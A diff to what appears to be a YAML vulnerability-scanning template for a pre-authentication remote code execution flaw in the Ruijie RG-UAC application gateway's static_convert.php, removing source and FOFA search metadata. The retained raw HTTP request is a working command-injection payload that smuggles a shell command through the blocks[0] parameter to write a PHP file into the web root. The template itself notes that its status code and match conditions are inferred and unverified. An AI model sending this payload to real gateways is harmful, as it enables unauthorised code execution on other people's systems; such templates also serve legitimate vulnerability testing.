@@ -3,14 +3,8 @@ info:
   name: 锐捷RG-UAC应用网关static_convert.php前台RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/358f4b83aeebdb82abc290e2d90ef34a
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 358f4b83aeebdb82abc290e2d90ef34a
-    fofa: fofa：app="Ruijie-RG-UAC"
 http:
 - raw:
   - 'GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20echo%20md5("666");unlink(__FILE__);?>%27%20>/var/www/html/ceshi.php HTTP/1.1
